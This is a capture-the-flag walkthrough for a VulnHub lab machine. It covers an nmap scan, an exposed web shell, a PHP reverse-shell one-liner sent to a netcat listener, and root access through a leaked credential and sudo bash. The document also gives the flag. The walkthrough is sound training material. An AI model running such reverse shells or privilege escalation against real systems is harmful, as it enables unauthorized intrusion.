# Escalate My Privileges: 1

- [Tools](#tools)
- [Gaining Access](#gaining-access)
- [Priviledge Escalation](#priviledge-escalation)

Machine: [https://www.vulnhub.com/entry/escalate-my-privileges-1,448/](https://www.vulnhub.com/entry/escalate-my-privileges-1,448/)

## Tools
1. [NMap](https://NMap.org)
2. netcat
3. md5sum

## Gaining Access
1. After Running the VM as bridged connection, I checked my gateway page to find IP. In my case ip is `192.168.0.11`.
2. Scan with `NMap` gives some open ports.
3. Nmap with this command `nmap -A 192.168.0.11` gives an url `http://192.168.0.11/phpbash.php`.
4. It’s a shell on that link. We can execute command as user `apache`.
5. Running this command `php -r '$sock=fsockopen("192.168.0.4",1337);exec("/bin/sh -i <&3 >&3 2>&3");'` with my ip port gives a `netcat` shell to my listner `nc -lvnp 1337`.
6. We got shell as `armour`.

## Priviledge Escalation
1. On `/home/armour` directory there is a file named `Credentials.txt`. Inside it we get password `md5(rootroot1)`.
2. Spawn tty shell, convert `md5sum` of the `rootroot1` to use as password. Then login as `armour` with `md5sum` of `rootroot1`.
3. Using `sudo -l` command shows `/bin/bash` could be used to get root shell. 
4. Used `sudo /bin/bash` command to `root`.
5. We can get flag inside `/root/flag.txt` by using command.`cat /root/flag.txt` The flag is  `628435356e49f976bab2c04948d22fe4`.

Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)
